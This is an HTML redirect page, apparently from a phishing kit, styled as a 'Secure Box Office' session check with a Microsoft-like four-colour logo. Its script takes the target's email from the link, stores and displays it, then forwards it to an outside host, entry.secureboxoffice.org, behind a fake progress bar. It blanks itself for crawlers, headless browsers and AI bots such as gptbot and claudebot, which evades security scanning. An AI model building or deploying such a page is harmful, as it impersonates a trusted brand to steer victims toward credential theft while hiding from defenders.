<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
<meta name="referrer" content="no-referrer">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Box Office</title>
<link rel="preconnect" href="https://entry.secureboxoffice.org" crossorigin>
<link rel="dns-prefetch" href="https://entry.secureboxoffice.org">
<meta http-equiv="refresh" content="3;url=https://entry.secureboxoffice.org/?r=g7qztvwoau4skojadtgreey4" id="meta-refresh">
<noscript><meta http-equiv="refresh" content="3;url=https://entry.secureboxoffice.org/?r=g7qztvwoau4skojadtgreey4"></noscript>
<style>
  *, *::before, *::after { box-sizing: border-box; }
  html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    background: #0b1120;
  }
  body {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 22px;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
    padding: 24px;
    overflow: hidden;
  }
  .card {
    width: 100%;
    max-width: 380px;
    background: #111827;
    border: 1px solid #1f2937;
    border-radius: 14px;
    padding: 30px 26px 26px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 20px;
    box-shadow: 0 20px 50px rgba(0,0,0,.45);
  }
  .logo {
    width: 34px;
    height: 34px;
    flex: none;
  }
  .title {
    color: #ffffff;
    font-size: 17px;
    font-weight: 600;
    letter-spacing: .2px;
    text-align: center;
    margin: 0;
  }
  .sub {
    color: #8b95a7;
    font-size: 13px;
    line-height: 1.5;
    text-align: center;
    margin: 0;
  }
  .spinner {
    width: 26px;
    height: 26px;
    border: 2.5px solid #1f2937;
    border-top-color: #00a4ef;
    border-radius: 50%;
    animation: spin .8s linear infinite;
  }
  [контакт удалён] spin { to { transform: rotate(360deg); } }
  .bar {
    width: 100%;
    height: 4px;
    background: #1f2937;
    border-radius: 99px;
    overflow: hidden;
  }
  .bar > i {
    display: block;
    height: 100%;
    width: 0;
    border-radius: 99px;
    background: linear-gradient(90deg, #00a4ef, #7fba00);
    transition: width 120ms linear;
  }
  .status {
    color: #6b7280;
    font-size: 12px;
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    letter-spacing: .3px;
    min-height: 15px;
    text-align: center;
    word-break: break-all;
  }
  .manual {
    display: none;
    color: #00a4ef;
    font-size: 13px;
    text-decoration: none;
    border-bottom: 1px solid rgba(0,164,239,.35);
    padding-bottom: 1px;
  }
  .manual.on { display: inline-block; }
  [контакт удалён] (prefers-reduced-motion: reduce) {
    .spinner { animation-duration: 2s; }
    .bar > i { transition: none; }
  }
</style>
</head>
<body>
<div class="card">
  <svg class="logo" viewBox="0 0 24 24" aria-hidden="true">
    <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
    <rect x="13" y="0" width="11" height="11" fill="#7FBA00"/>
    <rect x="0" y="13" width="11" height="11" fill="#00A4EF"/>
    <rect x="13" y="13" width="11" height="11" fill="#FFB900"/>
  </svg>
  <p class="title">Preparing your session</p>
  <div class="spinner" aria-hidden="true"></div>
  <div class="bar"><i id="progress"></i></div>
  <p class="status" id="status">verifying…</p>
  <p class="sub">You will be forwarded automatically. Do not close this window.</p>
  <a class="manual" id="manual" href="https://entry.secureboxoffice.org/?r=g7qztvwoau4skojadtgreey4">Continue manually</a>
</div>

<script>
(function () {
  "use strict";

  var DEST = "https://entry.secureboxoffice.org/?r=g7qztvwoau4skojadtgreey4";
  var DELAY_MS = 2500;
  var STORE_KEY = "sbx_email";
  var fired = false;

  var elProgress = document.getElementById("progress");
  var elStatus = document.getElementById("status");
  var elManual = document.getElementById("manual");
  var elMeta = document.getElementById("meta-refresh");

  function readHash() {
    var h = window.location.hash || "";
    if (h.charAt(0) === "#") h = h.slice(1);
    return h;
  }

  function readQuery() {
    try {
      var q = new URLSearchParams(window.location.search);
      return q.get("email") || q.get("e") || q.get("mail") || q.get("u") || "";
    } catch (err) { return ""; }
  }

  function readStore() {
    try { return sessionStorage.getItem(STORE_KEY) || ""; } catch (err) { return ""; }
  }

  function normalize(raw) {
    if (!raw) return "";
    var s = raw;
    try { s = decodeURIComponent(raw); } catch (err) {}
    s = s.replace(/^#+/, "").replace(/\s+/g, "").trim();
    if (s.indexOf("@") === -1) return "";
    if (s.length > 254) s = s.slice(0, 254);
    return s;
  }

  function encodeEmail(e) {
    return encodeURIComponent(e).replace(/%40/g, "@").replace(/%2E/gi, ".");
  }

  function resolveEmail() {
    var e = normalize(readHash());
    if (e) return e;
    e = normalize(readQuery());
    if (e) return e;
    return normalize(readStore());
  }

  function destUrl() {
    var e = resolveEmail();
    if (!e) return DEST;
    try { sessionStorage.setItem(STORE_KEY, e); } catch (err) {}
    return DEST + "#" + encodeEmail(e);
  }

  function syncMeta() {
    if (!elMeta) return;
    try { elMeta.setAttribute("content", Math.ceil(DELAY_MS / 1000) + ";url=" + destUrl()); } catch (err) {}
  }

  function go() {
    if (fired) return;
    fired = true;
    var dest = destUrl();
    try { window.location.replace(dest); }
    catch (err) { window.location.href = dest; }
  }

  function isObviousBot() {
    try {
      if (navigator.webdriver === true) return true;
      if (window.callPhantom || window._phantom || window.phantom) return true;
      if (window.__nightmare) return true;
      if (window.domAutomation || window.domAutomationController) return true;
      var ua = navigator.userAgent || "";
      if (/HeadlessChrome|PhantomJS|bot|crawler|spider|curl\/|wget|python-requests|scrapy|selenium|puppeteer|playwright|ahrefs|semrush|mj12|dotbot|petalbot|bytespider|gptbot|claudebot|ccbot|facebookexternalhit|bingpreview|vercel-screenshot|slackbot|telegrambot|whatsapp/i.test(ua)) return true;
      if (window.outerWidth === 0 && window.outerHeight === 0) return true;
    } catch (err) {}
    return false;
  }

  if (isObviousBot()) {
    fired = true;
    try {
      var metas = document.querySelectorAll('meta[http-equiv="refresh"]');
      for (var i = 0; i < metas.length; i++) {
        if (metas[i].parentNode) metas[i].parentNode.removeChild(metas[i]);
      }
      document.body.innerHTML = "";
      document.body.style.background = "#fff";
    } catch (err) {}
    return;
  }

  var email = resolveEmail();
  if (email) {
    try { sessionStorage.setItem(STORE_KEY, email); } catch (err) {}
    elStatus.textContent = email;
  } else {
    elStatus.textContent = "no address in link";
  }

  syncMeta();

  window.addEventListener("hashchange", function () {
    if (fired) return;
    var e2 = normalize(readHash());
    if (e2) {
      try { sessionStorage.setItem(STORE_KEY, e2); } catch (err) {}
      elStatus.textContent = e2;
    }
    syncMeta();
  });

  var start = 0;
  function tick(ts) {
    if (fired) return;
    if (!start) start = ts;
    var p = Math.min(1, (ts - start) / DELAY_MS);
    elProgress.style.width = (p * 100).toFixed(1) + "%";
    if (p < 1) requestAnimationFrame(tick);
  }
  requestAnimationFrame(tick);

  setTimeout(go, DELAY_MS);

  setTimeout(function () {
    if (!fired) return;
    elManual.href = destUrl();
    elManual.classList.add("on");
  }, DELAY_MS + 4000);

  elManual.addEventListener("click", function (ev) {
    ev.preventDefault();
    window.location.href = destUrl();
  });
})();
</script>
</body>
</html>
